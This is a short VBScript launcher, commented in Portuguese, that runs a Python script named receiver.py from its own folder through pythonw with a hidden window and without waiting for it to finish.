Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
receiverPath = scriptDir & "\receiver.py"

' Executa de forma 100% invisivel (0 = janela oculta, False = nao bloqueia)
WshShell.Run "%comspec% /c start /b pythonw """ & receiverPath & """", 0, False

